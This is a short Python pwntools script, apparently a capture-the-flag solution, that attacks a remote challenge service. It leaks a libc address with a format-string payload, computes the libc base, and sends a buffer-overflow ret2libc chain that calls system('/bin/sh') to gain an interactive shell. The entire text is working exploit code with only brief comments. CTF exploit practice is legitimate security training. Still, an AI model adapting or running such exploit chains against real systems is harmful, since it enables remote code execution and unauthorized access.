from pwn import *

libc = ELF("./libc.so.6")

leak_payload = b"%17$p"

p = remote("kashictf.iitbhucybersec.in", 64950)

# Getting leak
p.recvuntil(b"What do you want? ")
p.send(leak_payload+b"\n")

# Calculating libc base
leak = p.recvuntil(b"\n")
leak = leak.split(b" ")[-1].replace(b"\n", b"")
leak = int(leak, 16)
libc_offset = 0x7eff2f2b624a - 0x7eff2f28f000
libc_base = leak - libc_offset

# Creating payload for ret2lib
system = libc.sym["system"]+libc_base
sh = next(libc.search(b"/bin/sh")) + libc_base
pop_rdi_ret = 0x0277e5+libc_base
ret = pop_rdi_ret+1

payload = b"".join([
    b"A"*40,
    p64(ret),
    p64(pop_rdi_ret),
    p64(sh),
    p64(system)
])

# Sending it
p.send(payload+b"\n")
p.recvuntil(b"hahaha")
p.interactive()
